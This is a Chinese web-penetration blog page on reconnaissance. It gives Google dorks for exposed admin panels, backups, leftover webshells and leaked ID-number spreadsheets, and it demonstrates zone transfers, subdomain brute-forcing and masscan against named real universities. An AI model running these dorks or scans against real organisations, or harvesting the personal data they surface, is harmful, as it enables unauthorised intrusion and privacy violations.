-<h5 id="找目录遍历-上传点-数据库文件下载-phpmyadmin-网站后台及各种网站备份-源代码泄露等-同样也可以用这种方式慢慢找"><a href="#找目录遍历-上传点-数据库文件下载-phpmyadmin-网站后台及各种网站备份-源代码泄露等-同样也可以用这种方式慢慢找" class="headerlink" title="找目录遍历[上传点,数据库文件下载,phpmyadmin,网站后台及各种网站备份,源代码泄露等,同样也可以用这种方式慢慢找]:"></a>找目录遍历[上传点,数据库文件下载,phpmyadmin,网站后台及各种网站备份,源代码泄露等,同样也可以用这种方式慢慢找]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">site:</span>*.hk index of /admin</div><div class="line"><span class="symbol">site:</span>*.hk index of /upfiles</div><div class="line"><span class="symbol">site:</span>*.hk index of /fckeditor/editor/</div><div class="line"><span class="symbol">site:</span>*.tw index of /admin/uploadfile</div><div class="line"><span class="symbol">site:</span>*.tw index of /admin/file</div><div class="line"><span class="symbol">site:</span>*.tw index of /system/file</div><div class="line"><span class="symbol">site:</span>*.tw index of /phpmyadmin</div><div class="line"><span class="symbol">site:</span>*.tw index of /web/backup/</div><div class="line"><span class="symbol">inurl:</span>/phpmyadmin/index.php <span class="symbol">site:</span>*.tw</div></pre></td></tr></table></figure>
-<h5 id="搜同行们的各种工具脚本"><a href="#搜同行们的各种工具脚本" class="headerlink" title="搜同行们的各种工具脚本:"></a>搜同行们的各种工具脚本:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">绝大部分人在用别人东西的时候,基本是很少看里面代码的[即使开源],更不要说去除特征及后门,没办法现状如此,大家都很懒,既是如此,就不免要把自己的成果也被迫的共享给别人一份,所以养成良好的读代码习惯,是非常有必要的</div></pre></td></tr></table></figure>
-<h5 id="搜同行的脱裤脚本"><a href="#搜同行的脱裤脚本" class="headerlink" title="搜同行的脱裤脚本:"></a>搜同行的脱裤脚本:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intitle:</span>登录 - Adminer    这里只是随便举个例子,你可以自己平时多搜集一些境内外常用的脱裤脚本的标题,文件名什么的,慢慢尝试,root空密码也很正常</div></pre></td></tr></table></figure>
-<h5 id="同样-你也可以用上面这种方式来找下别人的aspx嗅探脚本-例如"><a href="#同样-你也可以用上面这种方式来找下别人的aspx嗅探脚本-例如" class="headerlink" title="同样,你也可以用上面这种方式来找下别人的aspx嗅探脚本,例如:"></a>同样,你也可以用上面这种方式来找下别人的aspx嗅探脚本,例如:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">websniff</div></pre></td></tr></table></figure>
-<h5 id="找别人遗留的各种webshell-平时注意多搜集一些镜内外常用的大马特征-这里只是随便举几个例子-你可以随意组装自己的"><a href="#找别人遗留的各种webshell-平时注意多搜集一些镜内外常用的大马特征-这里只是随便举几个例子-你可以随意组装自己的" class="headerlink" title="找别人遗留的各种webshell,平时注意多搜集一些镜内外常用的大马特征,这里只是随便举几个例子,你可以随意组装自己的:"></a>找别人遗留的各种webshell,平时注意多搜集一些镜内外常用的大马特征,这里只是随便举几个例子,你可以随意组装自己的:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>b374k.php <span class="symbol">filetype:</span>php</div><div class="line"><span class="symbol">inurl:</span>c99.php</div><div class="line"><span class="symbol">inurl:</span>c10<span class="number">0</span>.php Generation <span class="symbol">time:</span></div><div class="line"><span class="symbol">inurl:</span>itsecteam_shell.php</div><div class="line"><span class="symbol">intext:</span>x230<span class="number">0</span> Locus7Shell v. <span class="number">1.0</span>a beta Modded by</div><div class="line"><span class="symbol">intext:</span>c99shell <span class="symbol">inurl:</span>c99.php</div><div class="line">powered by Captain Crunch Security Team</div><div class="line"><span class="string">"inurl:c99.php"</span> + <span class="string">"intext:safe"</span></div><div class="line"><span class="symbol">intitle:</span>r57shell</div><div class="line"><span class="symbol">intitle:</span>c99shell +uname</div><div class="line"><span class="symbol">inurl:</span>c99.php uid=<span class="number">0</span>(root)</div><div class="line"><span class="symbol">intitle:</span>c99shell+<span class="symbol">filetype:</span>php</div><div class="line"><span class="symbol">intitle:</span>ly0kha shell</div><div class="line"><span class="symbol">inurl:</span>.php <span class="string">"cURL: ON MySQL: ON MSSQL: OFF"</span></div><div class="line"><span class="string">"Shell"</span> filetypehp <span class="symbol">intext:</span><span class="string">"uname -a:"</span> <span class="string">"EDT 2010"</span></div><div class="line"><span class="symbol">intitle:</span><span class="string">"intitle:r57shell"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">"c99.php"</span> &amp; <span class="symbol">intext:</span>Encoder Tools Proc. </div><div class="line"><span class="symbol">inurl:</span><span class="string">"c100.php"</span> &amp; <span class="symbol">intext:</span>Encoder Tools Proc. </div><div class="line"><span class="symbol">intitle:</span><span class="string">"Shell"</span> <span class="symbol">inurl:</span><span class="string">".php"</span> &amp; <span class="symbol">intext:</span>Encoder Tools Proc.</div></pre></td></tr></table></figure>
-<p><img src="/img/google webshell.png" alt=""><br></p>
-<h5 id="还有其他的更多工具特征-就留给大家自己去整理了"><a href="#还有其他的更多工具特征-就留给大家自己去整理了" class="headerlink" title="还有其他的更多工具特征,就留给大家自己去整理了"></a>还有其他的更多工具特征,就留给大家自己去整理了</h5><p><br></p>
-<h5 id="找到目标的owa和vpn入口-内网入口"><a href="#找到目标的owa和vpn入口-内网入口" class="headerlink" title="找到目标的owa和vpn入口[内网入口]:"></a>找到目标的owa和vpn入口[内网入口]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">owa入口:</div><div class="line">  <span class="symbol">inurl:</span>/owa/auth/logon <span class="symbol">intitle:</span>outlook</div><div class="line">  <span class="symbol">inurl:</span>/owa/auth/logon <span class="symbol">intext:</span>outlook</div><div class="line">   </div><div class="line">vpn入口:</div><div class="line">  <span class="symbol">inurl:</span>/sslvpn <span class="symbol">site:</span>hk</div></pre></td></tr></table></figure>
-<h5 id="找些好下手的目标子域"><a href="#找些好下手的目标子域" class="headerlink" title="找些好下手的目标子域:"></a>找些好下手的目标子域:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">site:</span>polyu.edu.hk <span class="symbol">inurl:</span>asp?pid=</div><div class="line"><span class="symbol">site:</span>polyu.edu.hk <span class="symbol">inurl:</span>aspx?id=</div><div class="line"><span class="symbol">site:</span>polyu.edu.hk <span class="symbol">inurl:</span>php?id=</div><div class="line"><span class="symbol">site:</span>polyu.edu.hk <span class="symbol">inurl:</span>jsp?id=</div><div class="line"><span class="symbol">site:</span>polyu.edu.hk <span class="symbol">inurl:</span><span class="keyword">do</span>?id=</div><div class="line"><span class="symbol">site:</span>polyu.edu.hk <span class="symbol">inurl:</span>cgi?id=</div></pre></td></tr></table></figure>
-<h5 id="找目标的数据库备份及其他敏感文件目录-后缀一般为-sql-mdb-txt……-像数据库和网站备份这种东西-还是建议直接用工具跑比较好-前提是字典务必要精心制作"><a href="#找目标的数据库备份及其他敏感文件目录-后缀一般为-sql-mdb-txt……-像数据库和网站备份这种东西-还是建议直接用工具跑比较好-前提是字典务必要精心制作" class="headerlink" title="找目标的数据库备份及其他敏感文件目录[后缀一般为 sql,mdb,txt……],像数据库和网站备份这种东西,还是建议直接用工具跑比较好,前提是字典务必要精心制作:"></a>找目标的数据库备份及其他敏感文件目录[后缀一般为 sql,mdb,txt……],像数据库和网站备份这种东西,还是建议直接用工具跑比较好,前提是字典务必要精心制作:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">filetype:</span>sql <span class="symbol">inurl:</span>backup <span class="symbol">inurl:</span>wp-content</div><div class="line"><span class="symbol">inurl:</span>/eWebEditor/db/ <span class="symbol">site:</span>*.com</div></pre></td></tr></table></figure>
-<h5 id="从目标网站上搜集目标邮箱-目标网站上的邮箱价值一般不是特别大"><a href="#从目标网站上搜集目标邮箱-目标网站上的邮箱价值一般不是特别大" class="headerlink" title="从目标网站上搜集目标邮箱,目标网站上的邮箱价值一般不是特别大:"></a>从目标网站上搜集目标邮箱,目标网站上的邮箱价值一般不是特别大:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">site:</span>*.gov.tw *@gov.tw</div></pre></td></tr></table></figure>
-<h5 id="关于google-hacking的东西基本就到此为止了-最后再推荐一个不错的google-dorks站点-方便大家练习"><a href="#关于google-hacking的东西基本就到此为止了-最后再推荐一个不错的google-dorks站点-方便大家练习" class="headerlink" title="关于google hacking的东西基本就到此为止了,最后再推荐一个不错的google dorks站点,方便大家练习:"></a>关于google hacking的东西基本就到此为止了,最后再推荐一个不错的google dorks站点,方便大家练习:</h5><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://cxsecurity.com/exploit/  非常推荐</div><div class="line">https://www.exploit-db.com/google-hacking-database/ 并不推荐,exp不错,但这方面比较废</div></pre></td></tr></table></figure>
-<h5 id="关于谷歌的一些好玩的小玩具-无聊的时候可以自己玩玩-方法很简单-直接在谷歌里面搜下面的关键字就行了-说实话比百度人性多了"><a href="#关于谷歌的一些好玩的小玩具-无聊的时候可以自己玩玩-方法很简单-直接在谷歌里面搜下面的关键字就行了-说实话比百度人性多了" class="headerlink" title="关于谷歌的一些好玩的小玩具,无聊的时候可以自己玩玩,方法很简单,直接在谷歌里面搜下面的关键字就行了(说实话比百度人性多了):"></a>关于谷歌的一些好玩的小玩具,无聊的时候可以自己玩玩,方法很简单,直接在谷歌里面搜下面的关键字就行了(说实话比百度人性多了):</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">do</span> a barrel roll</div><div class="line">Askew </div><div class="line">zerg rush</div><div class="line">google sphere</div><div class="line">atari breakout 图片碰碰球</div><div class="line">google gravity 碎片</div><div class="line">google sky</div><div class="line">blink html 抖动</div></pre></td></tr></table></figure>
-<h5 id="想必说大这里-你已经可以发现google到底是有多么的强大了"><a href="#想必说大这里-你已经可以发现google到底是有多么的强大了" class="headerlink" title="想必说大这里,你已经可以发现google到底是有多么的强大了:"></a>想必说大这里,你已经可以发现google到底是有多么的强大了:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">错误配置,敏感文件目录,各种信息泄露(源码泄露,重要配置文件泄露,密码泄露等),批量漏洞利用,最强大的社工库资源等等……你在web上所能利用到的一切,无死角尝试就可以了</div></pre></td></tr></table></figure>
-<h5 id="其他的一些小恶作剧-也不小了-不要瞎弄-做错了事始终要承担责任的"><a href="#其他的一些小恶作剧-也不小了-不要瞎弄-做错了事始终要承担责任的" class="headerlink" title="其他的一些小恶作剧,也不小了,不要瞎弄,做错了事始终要承担责任的:"></a>其他的一些小恶作剧,也不小了,不要瞎弄,做错了事始终要承担责任的:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">搜集个人身份证信息</div><div class="line"><span class="symbol">filetype:</span>xls 身份证 <span class="symbol">site:</span>cn</div><div class="line"></div><div class="line">搜集被盗QQ号什么的</div><div class="line">搜集别人还在有效期的信用卡,千万不要干坏事儿哦,不然后果你懂的……</div><div class="line"></div><div class="line">另外,还有图片识别,位置识别,谷歌为我提供了很多很强大的功能,有必要的话可以去深入学习下如何使用谷歌的这些api</div></pre></td></tr></table></figure>
-<p><br></p>
-<h5 id="关于robots-txt文件的作用"><a href="#关于robots-txt文件的作用" class="headerlink" title="关于robots.txt文件的作用:"></a>关于robots.txt文件的作用:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;此文件一般位于网站根目录下,规定了搜索引擎不能爬行的一些目录,一般都是一些敏感目录,比如:后台,数据库连接配置文件,安装目录等等……一般我们在试了几个常用的后台目录都不行的情况,习惯性的就会直接去访问下目标的robots.txt文件,很可能这文件里面就存的有后台路径但,那只是有可能,不尝试,连可能都没有<br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2014/12/13/bypasscdn/">
-                web渗透第一步之信息搜集 [ 透过cdn找目标真实ip ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2014-12-13</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/bypasscdn/">bypasscdn</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 在了解cdn之前,有必要先来科普下什么是负载均衡以及反向/正向代理,既然选择了做渗透,有些基础概念不熟悉肯定是不行的<br><br><br> 什么是正向代理[ForwardProxy]:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,大家默认说的代理都是正向代理,不管是正向还是反向,理解数据的流向很重要,要理解这种比较抽象的东西,最好的方式就是画图,比如下图就是一个正向代理的简易流程,要表达的意思,已经很清晰了,就是说当客户端要去请求远程server上的资源时,并非直接通过本地路由网关到达远程server,而是先经过代理服务器,由代理服务器去帮我们请求,之后远程服务器会把请求的结果返回给代理服务器再由代理服务器返回给客户端,这么一个过程就叫做正向代理,其实你还可以理解的更粗暴一点,它有点儿类似我们常说的 ‘翻墙’,正常情况我自己是不能直接上谷歌的,但我找了一个能上谷歌的代理,然后我们请求谷歌的时候可以让代理服务器去帮我们请求,最后,再通过代理服务器把响应的数据返回到我本地,这么一个过程,包括我们常用的vpn其实也有点儿类似的功能(当然,这里只是粗略的类似,但vpn本质[隧道]上是什么,在前面已经有相关说明),不过现在正向代理可能用的比较少了,以前用代理服务器只是为了提高访问速度[因为缓存的原因],可以节省带宽,也可以在代理服务器上做些访问限制……<br><br><br>
-        </div>
-        <a href="/2014/12/13/bypasscdn/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2014/12/12/subdomain-info-serarch/">
-                web渗透第一步之信息搜集 [搜集目标子域,旁站及C段信息]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2014-12-12</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/search-info/">search info</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>1,如果一个目标比较大,直接从目标主域开始[因为防的比较好],可能不太好下手,这时从目标的某个子域先进去,然后再想办法迂回接近我们的目标,无疑是个比较好的选择[所以说,安全是一个全面立体的概念,仅仅是边界几个点的安全,还是远远不够的]<br><br><br>2,那么,现在问题来了,怎么尽可能多的搜集目标子域呢<br><br><br>3,出于习惯性的反应,你应该首先去查下目标的ns服务器是否允许区域传送,如果允许,直接把目标的整个子域都备份过来即可,后面接下来要说的所有步骤就可以直接全省了,关于dig和nslookup的使用,请自行看命令帮助或谷歌之,实际测试中,个人更推荐dig:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">查目标的ns记录,然后挨个尝试目标ns服务器[务必是目标自己的ns服务器,第三方的不算]是否允许传送,虽然说,可能性不太大,但运气好也不一定呢,总之,多尝试就是了:</div><div class="line"><span class="comment"># dig +short @8.8.8.8 cityu.edu.hk ns</span></div><div class="line">vax.cityu.edu.hk.</div><div class="line">cpccspc.cityu.edu.hk.</div><div class="line">cpccux<span class="number">0</span>.cityu.edu.hk.</div></pre></td></tr></table></figure></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">通过上面的查询,我们确定了目标自己的三个dns服务器,下面就来尝试逐个传送[这里一定要注意,必须用目标自己的ns服务器来解析它自己的子域,如果还没搞清楚传送的具体原理,请务必先自行谷歌理解漏洞原理在来操作]:</div><div class="line"><span class="comment"># dig +nocmd <span class="doctag">@vax</span>.cityu.edu.hk cityu.edu.hk axfr</span></div><div class="line"><span class="comment"># dig +nocmd <span class="doctag">@cpccspc</span>.cityu.edu.hk cityu.edu.hk axfr</span></div><div class="line"><span class="comment"># dig +nocmd <span class="doctag">@cpccux</span>0.cityu.edu.hk cityu.edu.hk axfr</span></div></pre></td></tr></table></figure>
-<p><img src="/img/dig ns cityue.edu.hk axfr.png" alt=""><br></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">很显然,上面的这些ns服务器都不允许传送,这里就给大家一个可以传送的实例,看看实际的传送效果是什么样子的</div><div class="line"><span class="comment"># dig +nocmd <span class="doctag">@dns</span>2.communilink.net i-software.com.hk axfr</span></div></pre></td></tr></table></figure>
-<p><img src="/img/dig axfr scuued.png" alt=""><br></p>
-<p>4,如果目标ns服务器实在不允许传送,我们就要开始后面的步骤了,查记录,因为从这里也能获取一些目标子域,虽然想借此直接下手的可能性不太大,但对我们来讲同样有用<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">查目标的mx记录:</div><div class="line"><span class="comment"># dig +short cityu.edu.hk @8.8.8.8 mx</span></div><div class="line">smtp.cityu.edu.hk</div></pre></td></tr></table></figure></p>
-<p><br></p>
-<p>5,不让传送,其实也没什么特别好的办法,爆破呗,对于这类的子域爆破脚本,质量也是参差不齐,既然有成品,我们不妨就直接拿过来改吧改吧用,像这种小脚本,没必要非花那个时间去自己写(当然,如果你想练练代码还是很有必要的),不过,还是要先说明下,既然是个人写的小脚本,报错,不稳定,程序异常,是常有的事,毕竟,没有经过很多人长时间的测试,但我们的要求是能用,结果正确,相对稳定可靠即可,效率可暂时不做过多考虑<br><br><br>6,介绍两款自己常用的perl脚本,功能强大,且较稳定,不出意外的情况下,一般都是自己的首选<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dnsenum 	常用选项[信息规整,相对比较全面,ns,mx,a记录,尝试传送,从搜索引擎上抓取目标子域[谷歌,不太好使],自动爆破,最后把获取目标的所有的ip段以CIDR格式列出来,工具的整个执行流程跟我们之前手工的几乎是一模一样的]:</div><div class="line">-t 		指定爆破线程</div><div class="line">--dnsserver 	指定用于查询的dns服务器地址</div><div class="line">-f 		指定子域字典</div><div class="line">--enum		三个选项的集合 --threads <span class="number">5</span> -s <span class="number">15</span> -w</div></pre></td></tr></table></figure></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># dnsenum--dnsserver 8.8.8.8 --enum -f /usr/share/dnsenum/dns.txt cityu.edu.hk</span></div></pre></td></tr></table></figure>
-<p><img src="/img/dnsenum record.png" alt=""><br><br><img src="/img/dnsenum translate.png" alt=""><br><br><img src="/img/dnsenum domain.png" alt=""><br><br><img src="/img/dnsenum class c.png" alt=""><br></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">fierce 		常用选项[功能基本同dnsenum,推荐,实际测试中,效果会更好一些,速度很快,结果相对比较准]:</div><div class="line">-dns		指定要爆破的目标子域</div><div class="line">-dnsserver 	指定用域查询的dns服务器</div><div class="line">-threads	指定爆破线程</div><div class="line">-wordlist	指定域名字典</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># fierce -dns cityu.edu.hk -dnsserver 8.8.8.8 -threads 20 -wordlist /usr/share/dnsenum/dns.txt</span></div></pre></td></tr></table></figure>
-<p><img src="/img/fierce res.png" alt=""><br><br><img src="/img/fierce class c.png" alt=""><br></p>
-<p>7,其它的一些子域爆破脚本:<br>后面的几个工具基本都要依赖dnspython库,所以,需要事先安装下,不过,在最新版的kali,默认就已经装了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get install python-dnspython</span></div></pre></td></tr></table></figure></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">subbrute(说实话,并不怎么好用,速度慢,而且不太准):</div><div class="line">关于此脚本库依赖,配置详情,请自行参考 <span class="symbol">https:</span>/<span class="regexp">/github.com/</span>TheRook/subbrute </div><div class="line">names.txt		子域字典</div><div class="line">resolvers.txt 		用于请求的dns服务器地址</div><div class="line">target.txt		准备好目标域名文件</div><div class="line">-s 			指定自己的子域字典,默认会使用当前目录下的names.txt</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python subbrute.py -t target_domain.txt -c 16 -s /usr/share/dnsenum/dns.txt</span></div></pre></td></tr></table></figure>
-<p><img src="/img/subbrute.png" alt=""><br></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">subDomainsBrute[效果很一般,用的很少]:</div><div class="line">关于此脚本依赖及配置,请参考 https://github.com/lijiejie/subDomainsBrute</div><div class="line">dns_servers.txt 	存放用于请求的dns服务器地址,里面最好加上谷歌的8.8.8.8</div><div class="line">-t 	指定扫描线程</div><div class="line">-f 	指定用于爆破的域名字典</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip install dnspython gevent</span></div><div class="line"><span class="comment"># python subDomainsBrute.py -t 200 -f /usr/share/dnsenum/dns.txt cityu.edu.hk</span></div></pre></td></tr></table></figure>
-<p><img src="/img/subDomainBrute.png" alt=""><br></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Sublist3r(跟上面的纯字典爆破不同的是,该脚本是从各类搜索引擎中抓取目标子域,谷歌抓取一直都有问题[验证改的贼快,尼玛,不付费看来是不太好使了],顺带的端口探测还是蛮不错的,较实用,对了,使用该脚本务必挂上vpn,你应该懂的):</div><div class="line">在最新版的kali中,所依赖的各种py库已安装,更多脚本详情请参考 <span class="symbol">https:</span>/<span class="regexp">/github.com/aboul</span>3la/Sublist3r</div><div class="line">-d 	指定要爆破的目标子域</div><div class="line">-p 	扫描那些已经爆出来的子域所开放的端口</div><div class="line">-t 	指定爆破线程</div><div class="line">-e 	指定要爬取的搜索引擎,默认是从所有搜索引擎上抓取</div><div class="line">-b 	启用暴力破解模块</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip install -r requirements.txt</span></div><div class="line"><span class="comment"># python sublist3r.py -d cityu.edu.hk -p 80,443,8080 端口不宜太多,不然速度会很慢</span></div></pre></td></tr></table></figure>
-<p><img src="/img/sublist3r.png" alt=""><br><br><img src="/img/sublist3r res.png" alt=""><br></p>
-<p>8,前面基本都是一些在终端下跑的py小脚本,下面再来介绍一款纯图形化的信息搜集工具(它本身的功能还是非常实用的,抓取目标子域只是它的一个辅助小功能而已)foca[对于大目标非常好使],它最开始是用来搜集目标站点的各种元数据的[至于元数据是什么,里面包括哪些东西,请自行谷歌],但现在包括常规的web漏洞扫描,错误配置扫描,自定义谷歌dorks,支持外部插件等等……,功能已经非常完善了,而且纯图形化,配置选项[可使用google或者bing api]也是一目了然,相信大家一上手就会了,关键是能用它爬到我们想要的东西,最好再提醒一句,务必挂上vpn,谷歌可能有时还是用不了,尼玛<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">工具官方站点, <span class="symbol">https:</span>/<span class="regexp">/www.elevenpaths.com/labstools</span><span class="regexp">/foca/</span>   	请自行下载</div></pre></td></tr></table></figure></p>
-<p><img src="/img/foca.png" alt=""><br></p>
-<p>9,相信国内不少人对seay的Layer 比较熟悉,说实话,我自己用的比较少,工具总体上来讲,还算可以吧,除了爆破,顺便还会把http响应头中的各字段数据截取一下,使用非常简单,调好线程……给个目标子域,跑起来即可,字典文件和程序在同目录,如果你觉得它的字典质量不高,可以自己往里面加一些子域名,或者干脆用自己的字典,说实话,实际测试效果很一般<br><img src="/img/layer.png" alt=""><br></p>
-<p>10,目标大的话,找下C端网站也未尝不可,有机会还是能跨过去的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># masscan -p 80,81,82,443,8080,8081 144.214.2.0/24 --rate=100</span></div></pre></td></tr></table></figure></p>
-<p>11,如果你真的不太相信这类工具的话,也可以自己手工在google上一个个的翻,逐个分析判断,说不定可以找到很多工具发现不到的更有价值的子域,这绝逼不是开玩笑,工具可能由于各种各样的原因,很多时候并不那么靠谱,这都很正常,手工虽然会累点,但我们可以根据目标的实际价值做适当的取舍,总之,主要是看你要的是精准率还是图简单方便:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">site:</span>*.cityu.edu.hk谷歌找子域</div><div class="line"><span class="symbol">hostname:</span><span class="string">"cityu.edu.hk"</span>shodan可能效果会更好一点</div></pre></td></tr></table></figure></p>
-<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;关于子域的查找办法,基本就这些了,不管是硬破还是从各种搜索引擎上抓取,我们最终目的只是为了想法设法接近我们的目标或者拿到一个边界入口,为我们后续方便进入目标内部先铺好路,工具仅仅只是为了辅助我们快速完成这一目的,并非决定性因素,所以也大可不必在这类的工具上花太多时间,知道你自己想要的是什么极好了,还是那句话,你所搜集的每一个信息都有它存在的价值和意义,切记不要盲目<br><br><br></p>
-<h5 id="搜集目标的C段旁站信息-针对某些小型单个目标站点"><a href="#搜集目标的C段旁站信息-针对某些小型单个目标站点" class="headerlink" title="搜集目标的C段旁站信息[针对某些小型单个目标站点]:"></a>搜集目标的C段旁站信息[针对某些小型单个目标站点]:</h5><p>1,什么是旁站<br>在实际渗透过程中,我们可能经常会遇到这样的情况,我们的目标网站做的很到位,从目标网站本身基本上找不到什么比较好的入手点,这时候,如果想要快速拿下目标的话,一般都会先找个目标站点所在服务器上其他的比较好搞的网站下手,然后再想办法跨到目标的网站目录中,前提是有权限,如果实在跨不过去,就只能想办法先提权了,一般我们把这种渗透方式就叫旁站,至于渗透同服其它网站的方法,和常规的web渗透并没什不同,只是绕了个路进去而已,关于web渗透,后续还会有大量的篇幅专门来说明关于它的方方面面,这里先不用着急<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">旁站: 和目标网站在同一台服务器上的其它的网站</div></pre></td></tr></table></figure></p>
-<p><br><br>2,什么是C段<br>和旁站差不多的是,旁站是通过同一台服器上的其它网站跨到目标站的目录里,而C段,则是通过目标所在C段的其他任意一台机器,想办法跨到我们的目标机器上,至于怎么跨,嗅探,社工,web……随你便,反正最终目的能跨过去即可,实战可能还会有个问题就是,目标的机器在内网里面,也就是它根本没有公网ip[代理进去的],这种方法可能就不太管用了,另外,如果是虚拟机,这种方式可能也不太好使,因为提权比较难,这只是其中一些问题,很多其它的问题,我们暂时先不说,后续碰到再详细说,这里先理解一下基础概念即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C段: 和目标机器ip处在同一个C段的其它机器,即都在同一个交换机下</div></pre></td></tr></table></figure></p>
